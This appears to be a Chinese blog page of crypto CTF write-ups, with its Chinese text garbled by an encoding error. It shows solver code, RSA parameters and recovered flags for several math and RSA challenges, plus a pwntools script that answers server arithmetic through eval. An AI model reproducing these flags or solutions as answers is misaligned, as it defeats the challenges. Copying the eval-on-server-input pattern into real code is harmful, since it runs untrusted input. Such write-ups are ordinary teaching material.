<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = n // p</span><br><span class="line">d = invert(<span class="number">0x10001</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(unpad(long_to_bytes(m)).decode())</span><br><span class="line"><span class="comment"># 280953633736431747947064628051293908189096295024698457307220800187630550375386320255208827601751935813552184196283101709554718133038728081799604794900708412174536625884689548714026681568503654577602432205861968756823980122854293696554980209163635856940269021305243235482137890575873848821429361178108376901</span></span><br><span class="line"><span class="comment"># flag&#123;54b5dc19-5037-46c3-8afe-45394f236852&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="HDCTF2023-math-rsa"><a href="#HDCTF2023-math-rsa" class="headerlink" title="[HDCTF2023]math_rsa"></a>[HDCTF2023]math_rsa</h1><ul>
<li>äºŒæ¬¡å‰©ä½™</li>
</ul>
<p>ä¸»è¦é€šè¿‡ç”Ÿæˆå‚æ•°çš„æ»¡è¶³æ¡ä»¶è¿›è¡Œåˆ¤å®šçš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> r%<span class="number">4</span>==<span class="number">3</span></span><br><span class="line"><span class="comment"># å¯å¾—ræ¨¡4ä½™3</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(p,(r-<span class="number">1</span>)//<span class="number">2</span>,r)==<span class="number">1</span></span><br><span class="line"><span class="comment"># æ»¡è¶³äºŒæ¬¡å‰©ä½™ç›¸å…³ï¼Œå‹’è®©å¾·ç¬¦å·ä¸º1ï¼Œåˆ™ï¼Œpæ˜¯rçš„äºŒæ¬¡å‰©ä½™</span></span><br><span class="line"><span class="comment"># å³ p = x^2 mod r</span></span><br><span class="line">a=<span class="built_in">pow</span>(p,<span class="number">2</span>,r)</span><br><span class="line"><span class="comment"># a = p^2 mod rï¼Œ </span></span><br></pre></td></tr></table></figure>

<p><strong>æ¬§æ‹‰å‡†åˆ™</strong>ï¼Œâ€œ$a$æ˜¯æ¨¡$p$çš„äºŒæ¬¡å‰©ä½™â€œæ˜¯â€$a^{\frac{p - 1}{2}} \equiv 1\mod p$â€œçš„å……è¦æ¡ä»¶ã€‚</p>
<p>åˆ¤å®šä¸ºäºŒæ¬¡å‰©ä½™ç±»çš„ï¼Œç›´æ¥ä½¿ç”¨<code>Tonelli_Shanks()</code>æ±‚è§£$p$å³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Tonelli_Shanks</span>(<span class="params">a, p</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    no satisfy 3mod4ï¼Œto calculate remainder</span></span><br><span class="line"><span class="string">    or p is prime</span></span><br><span class="line"><span class="string">    references:</span></span><br><span class="line"><span class="string">    - https://rosettacode.org/wiki/Tonelli-Shanks_algorithm</span></span><br><span class="line"><span class="string">    - [V&amp;N2020]Easy RSA</span></span><br><span class="line"><span class="string">    - å¯ç­‰ä»·äºfrom sympy.ntheory.residue_ntheory import nthroot_mod(c, 2, r)-&gt; x^2 = c mod r</span></span><br><span class="line"><span class="string">    - å¯ç­‰ä»·äºsagemath: f.roots()</span></span><br><span class="line"><span class="string">    :param a: remainder</span></span><br><span class="line"><span class="string">    :param p: modulo</span></span><br><span class="line"><span class="string">    :return: r</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># STEP0</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">pow</span>(a, (p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> Fermat_2remainder(a, p)</span><br><span class="line">    <span class="comment"># STEP1</span></span><br><span class="line">    q = p - <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        q = q // <span class="number">2</span></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">    <span class="comment"># STEP2</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, p):</span><br><span class="line">        <span class="keyword">if</span> Legendre_Symbol(z, p) == p - <span class="number">1</span>:</span><br><span class="line">            c = <span class="built_in">pow</span>(z, q, p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># STEP3</span></span><br><span class="line">    r = <span class="built_in">pow</span>(a, (q+<span class="number">1</span>)//<span class="number">2</span>, p)</span><br><span class="line">    t = <span class="built_in">pow</span>(a, q, p)</span><br><span class="line">    m = s</span><br><span class="line">    <span class="comment"># STEP4</span></span><br><span class="line">    <span class="keyword">if</span> t % p == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> t % p != <span class="number">1</span>:</span><br><span class="line">            temp = <span class="built_in">pow</span>(t, <span class="number">2</span>**(i + <span class="number">1</span>), p)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> temp % p == <span class="number">1</span>:</span><br><span class="line">                b = <span class="built_in">pow</span>(c, <span class="number">2</span>**(m - i - <span class="number">1</span>), p)</span><br><span class="line">                r = r*b % p</span><br><span class="line">                c = b*b % p</span><br><span class="line">                t = t*c % p</span><br><span class="line">                m = i</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">p = Tonelli_Shanks(a, r)</span><br><span class="line"><span class="keyword">assert</span> isPrime(p) == <span class="number">1</span></span><br><span class="line"><span class="comment"># -&gt; åŸºç¡€RSA</span></span><br></pre></td></tr></table></figure>



<h1 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-ezMath"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-ezMath" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]ezMath"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]ezMath</h1><ul>
<li>pwnäº¤äº’</li>
</ul>
<p>å¾ˆç›´æ¥ï¼Œè·Ÿé¶æœºäº¤äº’ï¼Œåš100é“ç®€å•æ•°å­¦é¢˜ã€‚æƒ¯ä¾‹å…ˆè¿‡å“ˆå¸Œï¼Œç„¶åäº¤äº’åšé¢˜ã€‚</p>
<p>é€‚åˆä½œä¸ºäº¤äº’é¢˜ç›®çš„ç»ƒä¹ é¢˜ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">known: <span class="built_in">bytes</span>,hashcode</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	know sha256(XXXX+known) == hashcode</span></span><br><span class="line"><span class="string">	get the XXXX</span></span><br><span class="line"><span class="string">	charset = letter + digits</span></span><br><span class="line"><span class="string">	XXXX has four char</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	charset = string.ascii_letters + string.digits</span><br><span class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> charset:</span><br><span class="line">		<span class="keyword">for</span> b <span class="keyword">in</span> charset:</span><br><span class="line">			<span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">				<span class="keyword">for</span> d <span class="keyword">in</span> charset:</span><br><span class="line">					guess = a + b + c + d</span><br><span class="line">					<span class="keyword">if</span> sha256(guess.encode()+known).hexdigest() == hashcode:</span><br><span class="line">						<span class="keyword">return</span> guess</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">link = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿‡SHA256</span></span><br><span class="line"><span class="comment"># æ¥æ”¶</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[+] sha256(XXXX+B79N1NIZWlK7gHKB) == 40183d93c30a0316b45ebfabb07db7dc951e143e3fa3c4a004667e2f081c144b</span></span><br><span class="line"><span class="string">[+] Plz Tell Me XXXX :Hvoc</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># è¯»å–åˆ°ä¸€ç›´è¯»åˆ° sha256(XXXX+ çš„ pattern å‡ºç°ä¸ºæ­¢</span></span><br><span class="line">link.recvuntil(<span class="string">b&#x27;sha256(XXXX+&#x27;</span>)</span><br><span class="line">str1 = link.recvuntil(<span class="string">b&#x27;)&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">link.recvuntil(<span class="string">b&#x27;== &#x27;</span>)</span><br><span class="line">str2 = link.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">send_XXXX = proof_of_work(str1, str2.decode()).encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€</span></span><br><span class="line">link.sendlineafter(<span class="string">b&#x27;Plz Tell Me XXXX :&#x27;</span>, send_XXXX)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 100æ¬¡æ•°å­¦è®¡ç®—</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    link.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">    link.recvuntil(<span class="string">b&#x27; &#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    s = link.recvuntil(<span class="string">b&#x27;= &#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    sol_out = <span class="built_in">str</span>(<span class="built_in">eval</span>(s)).encode()</span><br><span class="line">    send_sol_out = link.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, sol_out)</span><br><span class="line">    link.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»“æŸè¿æ¥</span></span><br><span class="line">link.recvall()</span><br><span class="line"><span class="comment"># NSSCTF&#123;c629810b-e1b2-40f6-ac92-c88fb041d422&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="NSSCTF-round11-ez-fac"><a href="#NSSCTF-round11-ez-fac" class="headerlink" title="[NSSCTF-round11]ez_fac"></a>[NSSCTF-round11]ez_fac</h1><ul>
<li>è®ºæ–‡é¢˜</li>
</ul>
<p><strong>KEY</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(a0,<span class="number">2</span>) + e * <span class="built_in">pow</span>(b0,<span class="number">2</span>) == n</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(a1,<span class="number">2</span>) + e * <span class="built_in">pow</span>(b1,<span class="number">2</span>) == n</span><br></pre></td></tr></table></figure>

<p>$$<br>a_0^{2} + e \times b_0^{2} &#x3D;n<br>$$</p>
<p>$$<br>a_1^{2} + e\times b_1^{2} &#x3D; n<br>$$</p>
<p>æ ¹æ®è®ºæ–‡ä¸­æ€»ç»“ç®—æ³•ã€‚</p>
<img src="/2023/03/09/Crypto-Write-Up-zh/1.jpg" class="" title="note">

<p>$N$å­˜åœ¨ä¸¤ç§å½¢å¼çš„åˆ†è§£ï¼Œé‚£ä¹ˆ$gcd(N, ad -bc)&#x3D;p$ä¸€å®šæˆç«‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">temp = a0 * b1 - a1 * b0</span><br><span class="line">p = gcd(n, temp)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p.bit_length() == <span class="number">512</span></span><br><span class="line"><span class="keyword">assert</span> q.bit_length() == <span class="number">512</span></span><br><span class="line">e = (n - a0*a0)//(b0*b0)</span><br><span class="line"><span class="keyword">assert</span> e.bit_length() == <span class="number">128</span></span><br><span class="line">d = invert(e, (p - <span class="number">1</span>)*(q - <span class="number">1</span>))</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<h1 id="DCIC2023-math-exam"><a href="#DCIC2023-math-exam" class="headerlink" title="[DCIC2023]math_exam"></a>[DCIC2023]math_exam</h1><h2 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h2><ul>
<li>deduction</li>
</ul>
<p><strong>KEY</strong><br>$$<br>leak \equiv (n + p) \mod (q-1)<br>$$</p>
<p>$$<br>n &#x3D; p \times q<br>$$</p>
<p><strong>DEDUCTION-1</strong><br>$$<br>leak \equiv (p \times q + p )\mod (q-1) \equiv p(q + 1) \mod (q-1) \equiv 2p \mod (q-1)<br>$$</p>
<p>$$<br>\because p &gt; q<br>$$</p>
<p>$$<br>\therefore p \mod (q-1) &#x3D; p - (q - 1)<br>$$</p>
<p>$$<br>\Longrightarrow leak &#x3D; 2(p-(q-1))<br>$$</p>
<p>åˆ©ç”¨<code>sympy</code>ä¸­çš„<code>solve()</code>è®¡ç®—<code>p</code>ä»¥åŠ<code>q</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = var(<span class="string">&#x27;p1&#x27;</span>)</span><br><span class="line">q1 = var(<span class="string">&#x27;q1&#x27;</span>)</span><br><span class="line">sol1 = solve([<span class="number">2</span>*p1 - <span class="number">2</span>*(q1-<span class="number">1</span>) - leak1, p1*q1 - n1], [p1, q1])</span><br><span class="line"><span class="comment"># p1 = 11060083511635869933802569808428381768947206326091523957729804139074727442704400779515603361330886302679144280198610157348614007053927945774770324805383761</span></span><br><span class="line"><span class="comment"># q1 = 10951764080317305242419751556869357195913698564129507860483453991974582578672251918471161965453710637975575181911693960925380203354175653252256241955673123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>DEDUCTION-2</strong></p>
<p>ä¾æ—§å…ˆå¾—åˆ°:<br>$$<br>leak \equiv 2p \mod (q-1)<br>$$</p>
<p>$$<br>leak &#x3D; 2p + k(q-1)<br>$$</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œ$k$ çš„é‡çº§ä¸ä¼šå¤ªå¤§ï¼Œå¯ä»¥ç›´æ¥<strong>çˆ†ç ´</strong>ã€‚è€Œä¸”$p &gt; q$ï¼ŒåŸºæœ¬æƒ…å†µä¸‹å¯ç®€åŒ–ä¸º$p - (q - 1)$ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;x&gt; = PolynomialRing(ZZ)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">    f = k * (x - <span class="number">1</span>) * x + leak1 * x - <span class="number">2</span> * n1</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        q1 = f.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print(q1)</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">p1 = n1 // q1</span><br></pre></td></tr></table></figure>



<h2 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h2><ul>
<li>crack</li>
<li>limitation</li>
</ul>
<p><strong>KEY</strong><br>$$<br>leak &#x3D; d + p + q<br>$$</p>
<p>$$<br>e\cdot d \equiv 1 \mod phi<br>$$</p>
<p><strong>DEDUCTION-1</strong><br>$$<br>\because phi &#x3D; (p-1) \times (q-1) &#x3D; n - (p + q) + 1<br>$$</p>
<p>$$<br>\therefore p + q &#x3D; n + 1 - phi<br>$$</p>
<p>åˆ©ç”¨<strong>KEY-1</strong>ä»¥åŠ<strong>KEY-2</strong>è¿›è¡Œä»£å…¥å¤„ç†ï¼š<br>$$<br>e\cdot(leak - (p + q)) &#x3D; 1 + k \times phi<br>$$</p>
<p>$$<br>\Longrightarrow e \cdot (leak - n - 1 + phi) &#x3D; 1 + k\times phi<br>$$</p>
<p>$$<br>\Longrightarrow (e - k)\times phi &#x3D; e(n + 1 - leak) + 1<br>$$</p>
<p>$$<br>\therefore phi &#x3D; (e(n + 1 - leak) + 1) &#x2F;&#x2F; (e - k)<br>$$</p>
<p>æ‰€ä»¥ï¼Œå­˜åœ¨$k \in [1, e-1]$ï¼Œä½¿å¾—ä¸Šå¼æˆç«‹ï¼Œå†åˆ©ç”¨<code>flag</code>çš„ç‰¹æ®Šæ ¼å¼è¿›è¡Œåˆ¤æ–­ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶ã€‚</p>
<ul>
<li>$phi \mod (e - k) &#x3D;&#x3D; 0$</li>
<li><code>flag[4:5] == &#39;-&#39; and flag[9:10] == &#39;-&#39;</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65537</span>):</span><br><span class="line">    <span class="keyword">if</span> (e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span>) % (e2 - k) == <span class="number">0</span>:</span><br><span class="line">        phi = (e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span>) // (e2 - k)</span><br><span class="line">        d2 = <span class="built_in">int</span>(invert(e2, phi))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">            flag2 = (long_to_bytes(m2)[:<span class="number">14</span>]).decode()</span><br><span class="line">            <span class="keyword">if</span> flag2[<span class="number">4</span>:<span class="number">5</span>] == <span class="string">&#x27;-&#x27;</span> <span class="keyword">and</span> flag2[<span class="number">9</span>:<span class="number">10</span>] == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(flag2)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><strong>DEDUCTION-2</strong></p>
<p>å¯å¾—ï¼š<br>$$<br>(e - k)\times phi &#x3D; e(n + 1 - leak) + 1<br>$$<br>ç®€åŒ–ä¸€ä¸‹ï¼Œå³ä¸ºï¼š<br>$$<br>Kphi &#x3D; e(n + 1 - leak) + 1<br>$$<br>æ­¤æ—¶å¯ä»¥ç›´æ¥åˆ©ç”¨æ±‚é€†å…ƒçš„æ–¹å¼æ±‚è§£ç§é’¥$d$ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">K_phi = e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">d2 = <span class="built_in">int</span>(invert(e2, K_phi))</span><br></pre></td></tr></table></figure>

<p><em>æ¨¡phiä»¥åŠæ¨¡Kphiï¼Œç­‰ä»·</em></p>
<h2 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h2><ul>
<li>fermat</li>
</ul>
<p><strong>KEY</strong><br>$$<br>leak \equiv (p^{q} \mod n + q^{p} \mod n) \mod n<br>$$</p>
<p>$$<br>\mod n \rightarrow \mod p &#x2F;\mod q<br>$$</p>
<p><strong>DEDUCTION-1</strong><br>$$<br>leak \equiv p^{q} \mod n + q^{p}\mod n<br>$$</p>
<p>$$<br>\Longrightarrow leak \equiv p^{q} \mod q + q^{p} \mod p<br>$$</p>
<p>åˆ©ç”¨è´¹é©¬å°å®šç†$a^p \equiv a \mod p$ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ï¼š<br>$$<br>\Longrightarrow leak &#x3D; p + q<br>$$<br>è·Ÿ$n &#x3D; p \times q$ è”ç«‹æ–¹ç¨‹ï¼Œå¯æ±‚è§£å‡º$p$ä»¥åŠ$q$ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p3, q3 = var(<span class="string">&#x27;p3 q3&#x27;</span>)</span><br><span class="line">sol3 = solve([p3 + q3 - leak3, p3 * q3 - n3], [p3, q3])</span><br><span class="line"><span class="built_in">print</span>(sol3[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p><strong>DEDUCTION-2</strong></p>
<p>å¯å¾—ï¼š<br>$$<br>leak \equiv p^{q} \mod n + q^{p}\mod n<br>$$</p>
<p>$$<br>\rightarrow leak &#x3D; p + k_1 q<br>$$</p>
<p>$$<br>\rightarrow leak &#x3D; q + k_2 p<br>$$</p>
<p>$$<br>\Longrightarrow p + k_1 q &#x3D; q + k_2 p<br>$$</p>
<p>$$<br>\therefore k_1 &#x3D; 1, k_2 &#x3D; 1<br>$$</p>
<p>$$<br>\Longrightarrow leak &#x3D; p + q<br>$$</p>
<p>å›å½’ä¸Šé¢çš„ä»£ç ï¼Œè”ç«‹æ–¹ç¨‹æ±‚è§£$p$ä»¥åŠ$q$ã€‚</p>
<h2 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h2><p><strong>sagemath</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># %%</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">def unpad(msg):</span><br><span class="line">    return msg.split(b&#x27;\x00&#x27;)[0]</span><br><span class="line"></span><br><span class="line"># challenge 1</span><br><span class="line">e1 = 65537</span><br><span class="line">c1 = 112742443814287255411540092433156061065388404049949520959549377871297566383025041892192679147481155020865118811016470498351633875090973546567374001852295013083192495299811476604405637385307524194793969533646755764136014187430115618114840780368311166911900457224593131166970676797547489278410997707815915932756</span><br><span class="line">n1 = 121127425328043404860413278637978444801342472819958112597540188142689720655042880213001676368390521140660355813910726809125567752172921410143437643574528335234973793653775043030021036875866776532570781661875022102733555943967261003246543180935987772711036868216508554536086688819118597075508026787867088355603</span><br><span class="line">leak1 = 216638862637129382765636503118049146067015523924032194492700294200289728064297722088882791754351329407138196573832392846467607399504585045028165699421278</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZZ)</span><br><span class="line">for k in range(1, 4):</span><br><span class="line">    f = k * (x - 1) * x + leak1 * x - 2 * n1</span><br><span class="line">    try:</span><br><span class="line">        q1 = f.roots()[0][0]</span><br><span class="line">        # print(q1)</span><br><span class="line">        break</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">p1 = n1 // q1</span><br><span class="line">d1 = invert(e1, (p1 - 1)*(q1 - 1))</span><br><span class="line">m1 = int(powmod(c1, d1, n1))</span><br><span class="line">flag1 = unpad(long_to_bytes(m1)).decode()</span><br><span class="line">print(flag1)</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># challenge 2</span><br><span class="line">e2 = 65537</span><br><span class="line">c2 = 7964477910021153997178145480752641882728907630831216554750778499596527781702830885213467912351097301767341858663701574005489585561370961723264247818377063081744522471774208105250855114831033452448184392499682147532404562876275189577321587660597603848038824026981539659156304028998137796242331160312370913038</span><br><span class="line">n2 = 140571013522095816880929287025269553867630639381779595547026503691829940612178900269986625350464874598461222087427155791855120339533208468121389480964471710028253589422629569889402475311387750348466199387760629889238062977271925350490110043385800605640905324122017637306715108727700910035925728362455954862209</span><br><span class="line">leak2 = 58442382248753295429370894053397615609981110383986887405127350139482893508400422595729520437678203735054593866306478994471465948872565590901376309380029015549809468112086393107585011072503638322671608471684607214064187044372418770555236721845694224676090744181562673509234801011420696349507624867568099759003</span><br><span class="line"></span><br><span class="line">K_phi = e2 * (n2 - leak2 + 1) + 1</span><br><span class="line">d2 = int(invert(e2, K_phi))</span><br><span class="line">m2 = int(pow(c2, d2, n2))</span><br><span class="line">flag2 = unpad(long_to_bytes(m2)).decode()</span><br><span class="line">print(flag2)</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># challenge 3</span><br><span class="line">e3 = 65537</span><br><span class="line">c3 = 54161995127842474543974770981473422085334044100057089719350274921419091368361244533281599379235907845996678762379778310924192757650322930707785543132446159092950451255660204858292974657119337026589911330412367633761103944916751660957776230135927005700707688661350641600954072696774954805514477330339449799540</span><br><span class="line">n3 = 88207747624007183083381863279444163105330473097729276113333026679597864128605555600000789783468271680476780366740448641311570797876037993255307716167149079618302706650018518487351604778857406170722209469765782625409279109832638886179654096975665134276856272488090272822541461702907181545730309689190333058151</span><br><span class="line">leak3 = 19596671928335648228117128090384865424885102632642665068992144783391306491716530155291726644158221224616817878768426330717188403310818678195631582453246848</span><br><span class="line"></span><br><span class="line"># p3, q3 = var(&#x27;p3 q3&#x27;)</span><br><span class="line"># sol3 = solve([p3 + q3 - leak3, p3 * q3 - n3], [p3, q3])</span><br><span class="line"># print(sol3)</span><br><span class="line">p3 = 12591119529483514723681507251180531324926419443874102860338530066728710197246719851038994673567739600391874839712324936583490370533180101117667257937826949</span><br><span class="line">q3 = 7005552398852133504435620839204334099958683188768562208653614716662596294469810304252731970590481624224943039056101394133698032777638577077964324515419899</span><br><span class="line">d3 = invert(e3, (p3 - 1)*(q3 - 1))</span><br><span class="line">m3 = int(powmod(c3, d3, n3))</span><br><span class="line">flag3 = unpad(long_to_bytes(m3)).decode()</span><br><span class="line">print(flag3)</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line">flag = flag1 + flag2 + flag3</span><br><span class="line">assert len(flag) == 42</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>python</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># chall 1</span></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">c1 = <span class="number">112742443814287255411540092433156061065388404049949520959549377871297566383025041892192679147481155020865118811016470498351633875090973546567374001852295013083192495299811476604405637385307524194793969533646755764136014187430115618114840780368311166911900457224593131166970676797547489278410997707815915932756</span></span><br><span class="line">n1 = <span class="number">121127425328043404860413278637978444801342472819958112597540188142689720655042880213001676368390521140660355813910726809125567752172921410143437643574528335234973793653775043030021036875866776532570781661875022102733555943967261003246543180935987772711036868216508554536086688819118597075508026787867088355603</span></span><br><span class="line">leak1 = <span class="number">216638862637129382765636503118049146067015523924032194492700294200289728064297722088882791754351329407138196573832392846467607399504585045028165699421278</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">æ³•1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># p1 = var(&#x27;p1&#x27;)</span></span><br><span class="line"><span class="comment"># q1 = var(&#x27;q1&#x27;)</span></span><br><span class="line"><span class="comment"># sol1 = solve([2*p1 - 2*(q1-1) - leak1, p1*q1 - n1], [p1, q1])</span></span><br><span class="line">p1 = <span class="number">11060083511635869933802569808428381768947206326091523957729804139074727442704400779515603361330886302679144280198610157348614007053927945774770324805383761</span></span><br><span class="line">q1 = <span class="number">10951764080317305242419751556869357195913698564129507860483453991974582578672251918471161965453710637975575181911693960925380203354175653252256241955673123</span></span><br><span class="line"><span class="keyword">assert</span> p1 &gt; q1</span><br><span class="line"><span class="keyword">from</span> Functions_Eurynome <span class="keyword">import</span> Original_RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m1 = Original_RSA(p1, q1, e1, c1, n1)</span><br><span class="line">flag1 = (long_to_bytes(m1)[:<span class="number">14</span>]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chall 2</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">7964477910021153997178145480752641882728907630831216554750778499596527781702830885213467912351097301767341858663701574005489585561370961723264247818377063081744522471774208105250855114831033452448184392499682147532404562876275189577321587660597603848038824026981539659156304028998137796242331160312370913038</span></span><br><span class="line">n2 = <span class="number">140571013522095816880929287025269553867630639381779595547026503691829940612178900269986625350464874598461222087427155791855120339533208468121389480964471710028253589422629569889402475311387750348466199387760629889238062977271925350490110043385800605640905324122017637306715108727700910035925728362455954862209</span></span><br><span class="line">leak2 = <span class="number">58442382248753295429370894053397615609981110383986887405127350139482893508400422595729520437678203735054593866306478994471465948872565590901376309380029015549809468112086393107585011072503638322671608471684607214064187044372418770555236721845694224676090744181562673509234801011420696349507624867568099759003</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">æ³•1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># for k in range(1, 65537):</span></span><br><span class="line"><span class="comment">#     if (e2 * (n2 - leak2 + 1) + 1) % (e2 